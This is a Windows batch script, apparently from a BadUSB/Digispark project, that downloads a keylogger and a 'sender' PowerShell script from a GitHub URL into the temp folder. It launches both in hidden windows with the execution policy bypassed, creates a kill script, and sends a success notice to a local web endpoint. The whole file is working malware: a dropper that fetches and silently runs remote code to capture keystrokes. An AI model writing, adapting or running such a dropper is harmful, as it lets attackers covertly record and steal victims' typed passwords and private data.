@echo off
:: StealthManager.bat - Visible Main with Hidden Child Processes
:: Description: Main script runs visibly but launches keylogger and sender completely hidden

:: Phase 1: Set file paths
set "kl_path=%temp%\kl.ps1"
set "sn_path=%temp%\sn.ps1"
set "killer_path=%temp%\killer.bat"

echo [INFO] Checking for required files...
echo [DEBUG] KL Path: %kl_path%
echo [DEBUG] SN Path: %sn_path%

:: Phase 2: Download files if missing (with error handling)
if not exist "%kl_path%" (
    echo [INFO] Downloading KeyLogger.ps1...
    powershell -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/KeyLogger.ps1' -OutFile '%kl_path%' -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 (
        echo [ERROR] Failed to download KeyLogger.ps1
        pause
        exit /b 1
    )
)

if not exist "%sn_path%" (
    echo [INFO] Downloading Sender.ps1...
    powershell -command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/abolfazlrashidian/BadUSB/refs/heads/master/Digispark/KeyLogger/Sender.ps1' -OutFile '%sn_path%' -ErrorAction Stop } catch { exit 1 }"
    if errorlevel 1 (
        echo [ERROR] Failed to download Sender.ps1
        pause
        exit /b 1
    )
)

:: Phase 3: Execute both scripts COMPLETELY HIDDEN
echo [INFO] Launching KeyLogger (hidden)...
powershell -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%kl_path%' -WindowStyle Hidden -ErrorAction Stop"

echo [INFO] Launching Sender (hidden)...
powershell -command "Start-Process powershell.exe -ArgumentList '-NoLogo','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','%sn_path%' -WindowStyle Hidden -ErrorAction Stop"

:: Phase 4: Create killer script
echo [INFO] Creating killer.bat...
(
    echo @echo off
    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %kl_path%" 2^>nul
    echo taskkill /f /im powershell.exe /fi "COMMANDLINE eq -file %sn_path%" 2^>nul
    echo echo [INFO] Background processes terminated
    echo pause
) > "%killer_path%"

:: Phase 5: Send success notification
echo [INFO] Sending success notification...
powershell -command "try { Invoke-WebRequest -Uri 'http://localhost:5000/receive_text?text=Files+executed+successfully' -Method Get -ErrorAction SilentlyContinue } catch {}"

echo [INFO] All operations completed successfully
pause